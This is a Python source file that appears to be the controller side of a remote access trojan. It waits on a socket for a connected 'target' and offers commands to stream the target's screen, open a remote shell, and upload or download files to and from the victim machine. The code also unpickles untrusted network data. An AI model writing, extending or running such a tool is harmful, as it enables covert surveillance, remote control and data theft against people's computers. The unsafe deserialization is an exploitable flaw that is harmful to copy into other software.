import socket as s
import time
import tkinter as tk
from PIL import Image, ImageTk
import pickle
import _pickle
from threading import Thread

old = 'trol released.'
server = s.socket()
host = 'localhost'
port = 8080
last_good_frame, image, win = None, None, None
try:
    server.bind((host, port))
except s.error as e:
    print(str(e))
print('Server is listening...')
server.listen(5)
client, address = server.accept()
print("Connected...")
stop = False


class Shell:
    def __init__(self):
        self.on = True
        Thread(target=self.rcv).start()
        while self.on:
            txt = input()
            client.send(txt.encode())
            if txt == "exit":
                self.on = False

    def rcv(self):
        while self.on:
            print(client.recv(1024).decode(), end="")


def controls(event):
    global stop
    if event.keysym == "Escape":
        stop = True


def upload(filename, destination):
    file = open(filename, 'rb').read()
    client.send(destination.encode())
    client.send(str(len(file)).encode())
    client.sendall(file)


def split(size, num):
    arr = []
    while size > 0:
        size -= num
        arr.append(num)
    arr[-1] += size
    return arr


def download(filename, size):
    with open(filename, "wb") as wb:
        arr = split(size, 1024)
        for n in arr:
            wb.write(client.recv(n))
        wb.close()


result = b''
while True:
    command = input("Command (h for help): ")
    if command == "h":
        print('======= Commands =======')
        time.sleep(0.2)
        print('h: show list of commands.')
        time.sleep(0.2)
        print("screenshare: view the target's monitor.")
        time.sleep(0.2)
        print("shell: Access target's shell")
        time.sleep(0.2)
        print("upload /path/of/file /path/of/target: Uploads the file given to the target's selected directory.")
        time.sleep(0.2)
        print("download /path/of/target /path/of/file: Downloads the "
              "file from the target's directory to the selected directory.")
        time.sleep(0.2)
        print('========================')
        time.sleep(0.2)
    if command == 'screenshare':
        win = tk.Tk()
        win.config(width=1000, height=600)
        win.title("Client")
        win.resizable(False, False)
        win.bind("<Key>", controls)
        image = tk.Label()
        image.pack()
        client.send(b'scrnshr.rrn')
        while True:
            img = client.recv(36000)
            result = result + img
            if b'<sent>!#!<sent>' in img:
                result.replace(b'<sent>!#!<sent>', b'')
                try:
                    frame = pickle.loads(result)
                    last_good_frame = frame
                except _pickle.UnpicklingError:
                    frame = last_good_frame
                img = Image.fromarray(frame)
                img = img.resize((1000, 500))
                img = ImageTk.PhotoImage(image=img)
                image.configure(image=img)
                result = b''
                time.sleep(0.1)
                if stop:
                    client.send(b'stp.scrnshr.rrn')
                    win.destroy()
                    break
                else:
                    client.send(b'<done>!#!<done>')
                win.update()
    if command == 'shell':
        client.send(b'shll.rrn')
        Shell()
    if command == 'upload':
        fn = input("FILENAME: ")
        dst = input("DESTINATION: ")
        client.send(b'upld.rrn')
        upload(fn, dst)
    if command == 'download':
        fn = input("targeted file name and dir: ")
        dst = input("attacker's dir and downloaded file's name: ")
        client.send(b'dnld.rrn')
        client.send(fn.encode())
        download(dst, int(client.recv(1024).decode()))
